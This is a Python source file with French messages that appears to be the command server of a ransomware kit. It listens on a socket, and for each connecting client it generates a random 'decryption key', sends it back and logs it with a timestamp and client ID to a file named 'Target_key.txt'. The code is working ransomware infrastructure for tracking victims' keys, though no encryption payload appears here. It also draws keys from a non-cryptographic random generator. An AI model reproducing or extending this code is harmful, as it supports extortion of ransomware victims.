import os
import sys
import time
import select
import random
import socket
from colorama import init, Fore, Style

init()
class Generate_Key:
    def __init__(self):
        self.leight = 64

    def generate(self):
        key = str()
        value = "ABCDEFGHIGKLMNOPQRTUVWXYZabcdefghigklmnopqrtuvwxyz1234567890"
        for i in range(32):
            val = random.choice(value)
            key += val
        return key

class Server(Generate_Key):
    def __init__(self, adresse, port):
        super(Server, self).__init__()

        self.adresse = adresse
        self.port = port
        self.info_connection = None

    def run(self):
        connection_principal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            connection_principal.bind((self.adresse, self.port))
            connection_principal.listen(100)
        except Exception as e:
            print(Fore.RED + "[!!!] Erreur lors de la création du serveur en raison de %s\n" % e + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.BLUE + "[+++] Serveur en écoute sur le port %d" % self.port + Style.RESET_ALL)

        Connection = []
        Lancer_serveur = True
        Nombre_connection = 0
        while Lancer_serveur:
            try:
                Demande_connection, wlist, xlist = select.select([connection_principal], [], [], 0.05)
                for client in Demande_connection:
                    connection_client, self.info_connection = client.accept()
                    if connection_client:
                        Connection.append(connection_client)
                        Nombre_connection += 1
                        print(Fore.LIGHTCYAN_EX + "\n>>>>: Connection sur le serveur provenant de {} :<<<<".format(self.info_connection) + Style.RESET_ALL)
            except KeyboardInterrupt:
                pass

            Connect = []
            try:
                Connect, wlist, xlist = select.select(Connection, [], [], 0.05)
            except (KeyboardInterrupt, select.error):
                pass
            else:
                for sock in Connect:
                    try:
                        data = sock.recv(1024).decode()
                        if not data:
                            continue
                        else:
                            data_send = self.generate()
                            sock.sendall(data_send.encode())
                            print(Fore.BLUE + "\t  *| La cle de déchiffrement pour {}{} est : {} ".format(data, self.info_connection, data_send) + Style.RESET_ALL)
                            Temps = time.strftime("%A %d %B %Y %H:%M:%S")
                            with open("Target_key.txt", "a") as file:
                                file.write("{}> |Date: {} |ID: {}{}    Key: {}\n ".format(Nombre_connection, Temps,  data, self.info_connection, data_send))

                    except (ConnectionAbortedError,ConnectionResetError,ConnectionRefusedError,ConnectionError):
                        pass

        for deconnection in Connection:
            deconnection.close()
        connection_principal.close()
        print(Fore.RED + "\n >>>: Serveur déconnecté :<<<" + Style.RESET_ALL)



if __name__ == "__main__":
    adresse = 'localhost'
    port = 2500
    Server(adresse, port).run()

os.system('pause')
